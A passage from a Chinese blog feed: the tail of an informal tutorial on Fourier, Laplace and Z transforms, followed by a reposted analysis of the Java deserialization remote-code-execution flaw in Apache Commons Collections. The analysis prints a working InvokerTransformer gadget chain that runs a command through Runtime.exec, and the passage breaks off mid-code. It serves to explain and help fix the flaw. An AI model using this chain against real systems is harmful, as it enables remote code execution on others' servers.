src="https://www.zhihu.com/equation?tex=%5Cint_%7B0%7D%5E%7BT%7D%7Bf%5Cleft(+t+%5Cright)%5Csin%5Cleft(+%5Ctext%7Bn%CF%89t%7D+%5Cright)%5Ctext%7Bdt%7D%7D=b_%7Bn%7D%5Cint_%7B0%7D%5E%7BT%7D%7B%5Csin%7B%5Cleft(+%5Ctext%7Bn%CF%89t%7D+%5Cright)%5Csin%5Cleft(+k%5Ctext%7B%CF%89t%7D+%5Cright)%7D%5Ctext%7Bdt%7D%7D=b_%7Bn%7D%5Cint_%7B0%7D%5E%7BT%7Dsin(nwt)%5E%7B2%7Ddt" alt="[公式]"></p><p>进一步计算，可得</p><p><img src="https://www.zhihu.com/equation?tex=%5Cint_%7B0%7D%5E%7BT%7D%7Bf%5Cleft(+t+%5Cright)%5Csin%5Cleft(+%5Ctext%7Bn%CF%89t%7D+%5Cright)%5Ctext%7Bdt%7D%7D=b_%7Bn%7D%5Cfrac%7BT%7D%7B2%7D" alt="[公式]"></p><p><img src="https://www.zhihu.com/equation?tex=+b_%7Bn%7D+=+%5Cfrac%7B2%7D%7BT%7D%5Cint_%7B0%7D%5E%7BT%7D%7Bf%5Cleft(+t+%5Cright)%5Csin%5Cleft(+%5Ctext%7Bn%CF%89t%7D+%5Cright)%5Ctext%7Bdt%7D%7D+" alt="[公式]"></p><p>同样，<img src="https://www.zhihu.com/equation?tex=a_%7Bn%7D" alt="[公式]"> 也可以使用相同的方式进行推导</p><p>因此，通过 <img src="https://www.zhihu.com/equation?tex=a_%7Bn%7Db_%7Bn%7D" alt="[公式]"> 我们可以知道这个波的波幅与相位：</p><p><img src="https://www.zhihu.com/equation?tex=+c_%7Bn%7D+=+%5Csqrt%7B%7Ba_%7Bn%7D%7D%5E%7B2%7D+++%7Bb_%7Bn%7D%7D%5E%7B2%7D%7D+" alt="[公式]"></p><p><img src="https://www.zhihu.com/equation?tex=%5Cvarphi+=+arctan(+-+%5Cfrac%7Bb_%7Bn%7D%7D%7Ba_%7Bn%7D%7D)" alt="[公式]"></p><p>好了,这个基本就是傅里叶变换中最核心的傅里叶级数了</p><p>不是很复杂吧,你是不是很疑惑,为什么长得和傅里叶变换的标准公式差的有点多呢,标准公式不是长得是这样么:</p><p><img src="https://www.zhihu.com/equation?tex=+F%5Cleft(+f%5Cleft(+t+%5Cright)+%5Cright)+=+%5Cint_%7B-+%5Cinfty%7D%5E%7B%5Cinfty%7D%7Bf(t)e%5E%7B-+iwt%7D%5Ctext%7Bdt%7D%7D" alt="[公式]"></p><p>没关系,看看我们的欧拉公式</p><p><img src="https://www.zhihu.com/equation?tex=+e%5E%7B%5Ctext%7Bi%CE%B8%7D%7D+=+cos%5Ctheta+++isin%5Ctheta+" alt="[公式]"></p><p>然后把欧拉公式代入傅里叶变换</p><p><img src="https://www.zhihu.com/equation?tex=+F%5Cleft(+f%5Cleft(+t+%5Cright)+%5Cright)+=+%5Cint_%7B-+%5Cinfty%7D%5E%7B%5Cinfty%7D%7Bf%5Cleft(+t+%5Cright)%5Clbrack%5Ccos%5Cleft(+wt+%5Cright)+-+isin(wt)%5Crbrack%5Ctext%7Bdt%7D%7D+" alt="[公式]"></p><p><img src="https://www.zhihu.com/equation?tex=+F%5Cleft(+f%5Cleft(+t+%5Cright)+%5Cright)+=+%5Cint_%7B-+%5Cinfty%7D%5E%7B%5Cinfty%7D%7Bf%5Cleft(+t+%5Cright)%5Ccos%5Cleft(%5Comega+t+%5Cright)%5Ctext%7Bdt%7D%7D+-+%5Cint_%7B-+%5Cinfty%7D%5E%7B%5Cinfty%7D%7Bf%5Cleft(+t+%5Cright)%5Coperatorname%7Bisin%7D%5Cleft(+%5Comega+t+%5Cright)%5Ctext%7Bdt%7D%7D+" alt="[公式]"></p><p>你看,最终还不是换汤不换药,无非就是多了个复数,这个复数其实没有别的其它意义,作用就是在计算中和cos区分开来,扯到复平面上绕圈圈?没必要!</p><p>现在傅里叶变换讲完了,我们来看看拉普拉斯变换</p><p>真的,傅里叶搞懂了拉普拉斯变换基本上一句话就能讲完,如果不扯点傅里叶变换的东西,我估计会因为回答问题过于简短待会答案都被折叠了</p><p>先看看拉普拉斯变换公式</p><p><img src="https://www.zhihu.com/equation?tex=+F(s)+=%5Cint_%7B-+%5Cinfty%7D%5E%7B%5Cinfty%7D%7Bf(t)e%5E%7B-+st%7D%5Ctext%7Bdt%7D%7D=+%5Cint_%7B-+%5Cinfty%7D%5E%7B%5Cinfty%7D%7Bf(t)e%5E%7B-+(%5Csigma++iw)t%7D%5Ctext%7Bdt%7D%7D" alt="[公式]"></p><p>这搞毛呢,不就是傅里叶变换的公式乘以一个 <img src="https://www.zhihu.com/equation?tex=e%5E%7B-%5Csigma%7D" alt="[公式]"> 么,只要搞懂为什么要这么干,我们就能理解拉普拉斯变换了</p><p>我们来看看下面这个信号图</p><p><img src="https://pic1.zhimg.com/50/v2-853336361ecc499d208fd815b9cad2a3_hd.jpg" alt="img"><img src="https://pic1.zhimg.com/80/v2-853336361ecc499d208fd815b9cad2a3_hd.jpg" alt="img"></p><p>是的,这个信号的毛病在于,他已经上天了,是的,它增长的速度太快了,而我们却要使用不能够”上天”的正弦函数去拟合它,这不是为难我胖虎么,这个时候,我们就得想起一句名言,要么解决问题,要么解决制造问题的人(信号),既然傅里叶变换无法制造一个同样上天的正弦信号来拟合,我们就把它原本的信号”掰弯”,那么如何”掰弯”呢,简单,乘以一个 <img src="https://www.zhihu.com/equation?tex=e%5E%7B-%5Csigma%7D" alt="[公式]"> 就行了</p><p>然后图像就变成了这样</p><p><img src="https://pic4.zhimg.com/50/v2-e99d5a465d0c8d5045cf767c359305a0_hd.jpg" alt="img"><img src="https://pic4.zhimg.com/80/v2-e99d5a465d0c8d5045cf767c359305a0_hd.jpg" alt="img"></p><p>你看,这不就皆大欢喜了么,搞来搞去,拉普拉斯变换的意义无非就是把那些想要上天的函数掰弯,好最终变成那种适合做变换的函数,但是掰弯听起来不太专业,所以我们又管<img src="https://www.zhihu.com/equation?tex=e%5E%7B-%5Csigma%7D" alt="[公式]">叫衰减因子</p><p>好了,现在能解决 的信号我们有傅里叶变换解决了,不能解决的信号有拉普拉斯变换解决了,感觉上是不是皆大欢喜,写个软件跑跑看呗</p><p>这时你一拍脑袋!不好,信号是连续的,而计算机上存储的数据是离散的,这可咋办好,没关系,我们可以这样,每隔一小段距离,取一个点,最后用的时候把这些点连起来,不就能变成原来的的信号了么,当然我们还得研究研究,这个一小段距离究竟得多小,才不至于让原信号失真,这个就得参考参考香农采样定律了</p><p>好的,现在我们把连续的信号换一下,换成离散的”点”,首先积分是不能用了,既然换成离散的了,积分对应的就应该变成累加符号 <img src="https://www.zhihu.com/equation?tex=%5CSigma" alt="[公式]"> ,当然,<img src="https://www.zhihu.com/equation?tex=f(t)" alt="[公式]"> 也是不能用了,这是一个连续信号的写法,而离散的一个一个的点得换成 <img src="https://www.zhihu.com/equation?tex=x%5Bn%5D" alt="[公式]"> ,其中的n表示第n个点,实际上就是时间变来的,当然 <img src="https://www.zhihu.com/equation?tex=e%5E%7B-j%5Comega+t%7D" alt="[公式]"> 也不能用了,你想啊,我们要具体到某个点,这个点怎么表示,当然了,首先把 <img src="https://www.zhihu.com/equation?tex=t" alt="[公式]"> 时间换成 <img src="https://www.zhihu.com/equation?tex=n" alt="[公式]"> 索引号,然后 <img src="https://www.zhihu.com/equation?tex=w" alt="[公式]"> 这个动态的角速度值换成具体的角度 <img src="https://www.zhihu.com/equation?tex=%5Cphi" alt="[公式]"></p><p>好了,我们终于把连续信号的傅里叶变换变成了离散信号的傅里叶变换,写写看</p><p><img src="https://www.zhihu.com/equation?tex=A%5Csum_%7B-%5Cinfty%7D%5E%7B%5Cinfty%7D%7Bx%5Bn%5De%5E%7B-j%5Cphi+n%7D%7D" alt="[公式]"></p><p>令 <img src="https://www.zhihu.com/equation?tex=z=Ae%5E%7Bj%5Cphi%7D" alt="[公式]"> 得到</p><p><img src="https://www.zhihu.com/equation?tex=X(z)=%5Csum_%7B-%5Cinfty%7D%5E%7B%5Cinfty%7D%7Bx%5Bn%5Dz%5E%7B-n%7D%7D+" alt="[公式]"></p><p>哎呀,一不小心把Z变换的公式也写出来了,原来搞了半天,不就是傅里叶变换的离散形式么.</p><p>最后总结一下</p><p><img src="https://pic3.zhimg.com/50/v2-3d77916a96663ed60abe33ceabed16f1_hd.jpg" alt="img"><img src="https://pic3.zhimg.com/80/v2-3d77916a96663ed60abe33ceabed16f1_hd.jpg" alt="img"></p><p>数学分析工具就是这样,当出现解决不了的问题之后,随之就会出现改进的方案,我们可以说,拉普拉斯变换是为了解决一些”太飘了”或者专业说法叫不收敛的信号,而z变换则用于解决了信号的存储和编码问题,那么,那么还有没有别的问题?</p><p>有的,从时域到频域,频域的时间信息消失了,你有没觉得之前我们分析的信号都太理想化了,现实中的信号往往随着时间而变化并非一成不变的,比如一辆车向你开来然后远去,你会听到声音从尖锐逐渐变得浑浊,这是多普勒效应造成的,而你收到的声音信号也由高频逐渐变为低频,而傅里叶变换只能告诉你信号中存在某种频率的信号,但却不能告诉你这个频率的信号是在什么时候出现的.它可能一直存在,或者只存在前半段信号里,可能存在后半段信号里.或者别的区间.</p><p>这个时候,又出现了傅里叶变换的改进版本,叫短时傅里叶变换.简单来说就是一段信号,假如这个信号长度是1秒,那么就每隔0.1秒就做一次傅里叶变换,总共做10次,这样,第一个变换的结果对应0-0.1s的信号频谱,第二个变换结果对应0.1-0.2s的信号频谱</p><p>虽然短时傅里叶提供了一个粗糙版本的方案把时间的概念引入频域,但无法解决信号拟合的问题,我们使用正弦波去拟合方波,我们就需要用无穷多个不同频率的正弦波去拟合以抵消时频间的能量差异,简单来说,一个方波我们用正弦波去拟合,最终会拟合成这个样子</p><p><img src="https://pic4.zhimg.com/50/v2-ee38d87de684b7108a0c8a107c4a0514_hd.jpg" alt="img"><img src="https://pic4.zhimg.com/80/v2-ee38d87de684b7108a0c8a107c4a0514_hd.jpg" alt="img"></p><p>为了解决上面两个问题,小波变换诞生了,要使用小波变换,在进行变换前首先需要挑选合适的母小波(也常常叫基波函数,以前实验室里经常被用来调侃:喲,你搞个基波啊),然后通过对母小波的平移和缩放,最终去拟合原信号,在平移的过程中,最终也把时间信息带入了频域(小波域)中,同时不同的母小波也更好解决了信号的拟合问题,当然,大多小波变换的核心原理,最终和傅里叶变换一样,利用了正交性来检波(有的基波没有正交性,例如morlet和mexican hat,这类小波在用于离散小波变换时有限制性)</p><p>那么如何挑选母小波呢?不用担心,数学大佬们为我们总结了一堆好用的母小波,按照响应的情况挑选就行了</p><p><img src="https://pic1.zhimg.com/50/v2-b98eee21c5fcbc31c77fa3b6c0d2faa3_hd.jpg" alt="img"><img src="https://pic1.zhimg.com/80/v2-b98eee21c5fcbc31c77fa3b6c0d2faa3_hd.jpg" alt="img"></p><p>什么,太简略了不过瘾?</p><p><a href="https://zhuanlan.zhihu.com/p/77345128">DBinary：傅里叶变换推导详解zhuanlan.zhihu.com<img src="https://pic2.zhimg.com/equation_ipico.jpg" alt="图标"></a><a href="https://zhuanlan.zhihu.com/p/77347644">DBinary：离散傅里叶变换DFT详解及应用zhuanlan.zhihu.com<img src="https://pic3.zhimg.com/equation_ipico.jpg" alt="图标"></a><a href="https://zhuanlan.zhihu.com/p/72644228">DBinary：从三角函数到离散傅里叶变换到语音识别再到图像频域鲁棒性水印zhuanlan.zhihu.com<img src="https://pic1.zhimg.com/equation_ipico.jpg" alt="图标"></a><a href="https://zhuanlan.zhihu.com/p/85299446">DBinary：详解离散余弦变换（DCT）zhuanlan.zhihu.com<img src="https://pic1.zhimg.com/equation_ipico.jpg" alt="图标"></a></p><p>references:</p><p>奥本海姆大佬&lt;&lt;信号与系统&gt;&gt; &lt;&lt;离散时间信号处理&gt;&gt; 大佬是我心中永远的神</p><p>&lt;&lt;小波十讲&gt;&gt;他们说这本书是本好书,可惜我真没几章看的懂</p><p>&lt;&lt;数字语音处理理论与应用&gt;&gt; 声控福利,宅男必备,论如何秒变萝莉音忽悠沙雕网友</p>]]></content>
      
      
      <categories>
          
          <category> 傅里叶变换 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反序列化漏洞</title>
      <link href="/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p>Lib之过？Java反序列化漏洞通用利用分析    转自：<a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/">https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/</a></p> <a id="more"></a><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>2015年11月6日，FoxGlove Security安全团队的@breenmachine 发布的一篇博客[3]中介绍了如何利用Java反序列化漏洞，来攻击最新版的WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些大名鼎鼎的Java应用，实现远程代码执行。</p><p>然而事实上，博客作者并不是漏洞发现者。博客中提到，早在2015年的1月28号，Gabriel Lawrence (@gebl)和Chris Frohoff (@frohoff)在AppSecCali上给出了一个报告[5]，报告中介绍了Java反序列化漏洞可以利用Apache Commons Collections这个常用的Java库来实现任意代码执行，当时并没有引起太大的关注，但是在博主看来，这是2015年最被低估的漏洞。</p><p>确实，Apache Commons Collections这样的基础库非常多的Java应用都在用，一旦编程人员误用了反序列化这一机制，使得用户输入可以直接被反序列化，就能导致任意代码执行，这是一个极其严重的问题，博客中提到的WebLogic等存在此问题的应用可能只是冰山一角。</p><p>虽然从@gebl和@frohoff的报告到现在已经过去了将近一年，但是@breenmachine的博客中提到的厂商也依然没有修复，而且国内的技术人员对这个问题的关注依然较少。为了帮助大家更好的理解它，尽快避免和修复这些问题，本文对此做了一个深入的漏洞原理和利用分析，最后对上面提到的这些受影响的应用，在全球范围内做一个大概的统计。</p><h2 id="Java反序列化漏洞简介"><a href="#Java反序列化漏洞简介" class="headerlink" title="Java反序列化漏洞简介"></a>Java反序列化漏洞简介</h2><p>序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。Java中的<code>ObjectOutputStream</code>类的<code>writeObject()</code>方法可以实现序列化，类<code>ObjectInputStream</code>类的<code>readObject()</code>方法用于反序列化。下面是将字符串对象先进行序列化，存储到本地文件，然后再通过反序列化进行恢复的样例代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> Exception </span>&#123; </span><br><span class="line">    String obj = <span class="string">&quot;hello world!&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将序列化对象写入文件object.db中</span></span><br><span class="line">    FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">&quot;object.db&quot;</span>);</span><br><span class="line">    ObjectOutputStream os = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">    os.writeObject(obj);</span><br><span class="line">    os.close();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 从文件object.db中读取数据</span></span><br><span class="line">    FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;object.db&quot;</span>);</span><br><span class="line">    ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过反序列化恢复对象obj</span></span><br><span class="line">    String obj2 = (String)ois.readObject();</span><br><span class="line">    ois.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题在于，如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行。</p><p>所以这个问题的根源在于类<code>ObjectInputStream</code>在反序列化时，没有对生成的对象的类型做限制；假若反序列化可以设置Java类型的白名单，那么问题的影响就小了很多。</p><p>反序列化问题由来已久，且并非Java语言特有，在其他语言例如PHP和Python中也有相似的问题。@gebl和@frohoff的报告中所指出的并不是反序列化这个问题，而是一些公用库，例如Apache Commons Collections中实现的一些类可以被反序列化用来实现任意代码执行。WebLogic、WebSphere、JBoss、Jenkins、OpenNMS这些应用的反序列化漏洞能够得以利用，就是依靠了Apache Commons Collections。这种库的存在极大地提升了反序列化问题的严重程度，可以比作在开启了ASLR地址随机化防御的系统中，出现了一个加载地址固定的共享库，或者类似twitter上的评论中的比喻：</p><p><img src="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/blame.jpg" alt="image"></p><p>@breenmachine的博客中将漏洞归咎于Apache Commons Collections这个库，存在一定的误解。</p><h2 id="利用Apache-Commons-Collections实现远程代码执行"><a href="#利用Apache-Commons-Collections实现远程代码执行" class="headerlink" title="利用Apache Commons Collections实现远程代码执行"></a>利用Apache Commons Collections实现远程代码执行</h2><p>参考Matthias Kaiser在11月份的报告[1]，我们以Apache Commons Collections 3为例，来解释如何构造对象，能够让程序在反序列化，即调用<code>readObject()</code>时，就能直接实现任意代码执行。</p><p><code>Map</code>类是存储键值对的数据结构，Apache Commons Collections中实现了类<code>TransformedMap</code>，用来对<code>Map</code>进行某种变换，只要调用<code>decorate()</code>函数，传入key和value的变换函数<code>Transformer</code>，即可从任意<code>Map</code>对象生成相应的<code>TransformedMap</code>，<code>decorate()</code>函数如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Transformer</code>是一个接口，其中定义的<code>transform()</code>函数用来将一个对象转换成另一个对象。如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Transformer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当<code>Map</code>中的任意项的Key或者Value被修改，相应的<code>Transformer</code>就会被调用。除此以外，多个<code>Transformer</code>还能串起来，形成<code>ChainedTransformer</code>。</p><p>Apache Commons Collections中已经实现了一些常见的<code>Transformer</code>，其中有一个可以通过调用Java的反射机制来调用任意函数，叫做<code>InvokerTransformer</code>，代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title">Transformer</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class cls = input.getClass();</span><br><span class="line">            Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只需要传入方法名、参数类型和参数，即可调用任意函数。因此要想任意代码执行，我们可以首先构造一个<code>Map</code>和一个能够执行代码的<code>ChainedTransformer</code>，以此生成一个<code>TransformedMap</code>，然后想办法去触发<code>Map</code>中的<code>MapEntry</code>产生修改（例如<code>setValue()</code>函数），即可触发我们构造的Transformer。</p><p>测试代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">            String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">            <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">            Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">            <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">            String.class &#125;, <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">    Transformer transformedChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    Map innerMap = <span class="keyword">new</span> hashMap();</span><br><span class="line">    innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">    Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">    Map.Entry onlyElement = (Entry) outerMap.entrySet().iterator().next();</span><br><span class="line">    onlyElement.setValue(<span class="string">&quot;foobar&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码运行到<code>setValue()</code>时，就会触发<code>ChainedTransformer</code>中的一系列变换函数：首先通过<code>ConstantTransformer</code>获得<code>Runtime</code>类，进一步通过反射调用<code>getMethod</code>找到<code>invoke</code>函数，最后再运行命令<code>calc.exe</code>。</p><p>但是目前的构造还需要依赖于触发<code>Map</code>中某一项去调用<code>setValue()</code>，我们需要想办法通过<code>readObject()</code>直接触发。</p><p>我们观察到java运行库中有这样一个类<code>AnnotationInvocationHandler</code>，这个类有一个成员变量<code>memberValues</code>是<code>Map</code>类型，如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AnnotationInvocationHandler</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class&lt;? extends Annotation&gt; type;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String, Object&gt; memberValues;</span><br><span class="line"></span><br><span class="line">    AnnotationInvocationHandler(Class&lt;? extends Annotation&gt; type, Map&lt;String, Object&gt; memberValues) &#123;</span><br><span class="line">        <span class="keyword">this</span>.type = type;</span><br><span class="line">        <span class="keyword">this</span>.memberValues = memberValues;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>更令人惊喜的是，<code>AnnotationInvocationHandler</code>的<code>readObject()</code>函数中对<code>memberValues</code>的每一项调用了<code>setValue()</code>函数，如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">    AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        annotationType = AnnotationType.getInstance(type);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// Class is no longer an annotation type; all bets are off</span></span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">        String name = memberValue.getKey();</span><br><span class="line">        Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">        <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">            Object value = memberValue.getValue();</span><br><span class="line">            <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                  value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                <span class="comment">// 此处触发一些列的Transformer</span></span><br><span 